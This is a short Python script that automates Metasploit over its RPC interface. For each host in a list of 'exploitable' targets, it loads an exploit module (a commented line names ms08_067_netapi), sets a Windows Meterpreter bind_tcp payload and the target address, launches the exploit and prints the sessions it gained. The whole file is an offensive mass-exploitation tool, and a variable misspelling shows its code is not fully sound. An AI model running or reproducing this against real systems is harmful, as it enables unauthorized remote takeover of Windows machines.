#!/usr/bin/python3.2
import msgpack
import urllib
import time 
import urllib.request
import library.metasploitLibrary as msf
import sys
import os

foldername = sys.argv[1]
filein = open("./tmp/'"+foldername+"'/exploitable.txt", "r")

Exploits = filein.read()

hosts = Exploits.split("\n")

for host in hosts:
	msfapi = msf.Core() 
	variables = host.split(",")
	hostip = varibles[0]
	cmd = "use "+variables[2]+"\n"
	#cmd = "use exploit/windows/smb/ms08_067_netapi\n"
	response = msfapi.run(params=['console.write', cmd]) 
	cmd = "set PAYLOAD windows/meterpreter/bind_tcp\n"
	response = msfapi.run(params=['console.write', cmd])
	cmd = "set RHOST "+hostip+"\n"
	response = msfapi.run(params=['console.write', cmd])
	cmd = "exploit -z\n"
	response = msfapi.run(params=['console.write', cmd])
	time.sleep(3)
	response = msfapi.run(params=['session.list']) 
	print("Wow ... it worked Heres your sessions") 
	print("%s\t%s" % ("Session ID", "Target")) 
	for S_id in response: 
		print(S_id)
	msfapi.run(params=['console.destroy'])
	time.sleep(2)

